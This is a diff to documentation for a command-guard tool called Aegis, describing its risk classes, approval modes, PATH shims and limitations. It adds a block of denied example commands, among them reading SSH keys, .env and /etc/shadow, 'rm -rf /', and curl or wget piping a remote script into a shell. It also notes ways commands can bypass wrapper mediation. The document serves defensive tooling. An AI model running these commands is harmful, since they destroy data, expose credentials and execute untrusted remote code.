@@ -1,7 +1,34 @@
-# Command Guard
+# Commands
 
-Aegis classifies commands that pass through Aegis run paths or generated shims. It is wrapper-mediated, not a guarantee that commands launched outside Aegis are controlled.
+Aegis checks the direct command before launch and installs session PATH shims for common risky command names.
 
-High-risk classifications include destructive filesystem commands, privilege escalation, remote shell tools, git remote writes, credential inspection, network scripts piped into shells, command chaining with risky payloads, shell command substitution, and PowerShell encoded commands.
+## Risk Classes
 
-CI mode never prompts. Ask decisions become deny in CI. Command strings written to audit are bounded and redacted before persistence.
+The command classifier detects credential inspection, destructive filesystem actions, network script execution, privilege escalation, obfuscation, remote access, package execution, and VCS publishing risks.
+
+## Examples
+
+Denied or risky examples include:
+
+```sh
+cat .env
+cat ~/.ssh/id_ed25519
+rm -rf /
+find . -delete
+curl https://example.invalid/install.sh | sh
+wget -O- https://example.invalid/install.sh | bash
+sudo cat /etc/shadow
+git push --force
+```
+
+## Approvals
+
+Interactive `ask` mode can prompt. Approval scopes are once or session. CI mode never prompts; ask becomes deny.
+
+## Shims And Wrappers
+
+PATH shims cover shells, package managers, network tools, Python/Node, SSH/SCP/Netcat, PowerShell, and cmd wrappers. They are wrapper-level coverage, not transparent OS interception.
+
+## Limitations
+
+Commands that bypass the Aegis session, use absolute paths outside shim coverage, or run under privileged bypasses may avoid wrapper mediation unless the platform backend provides stronger enforcement.
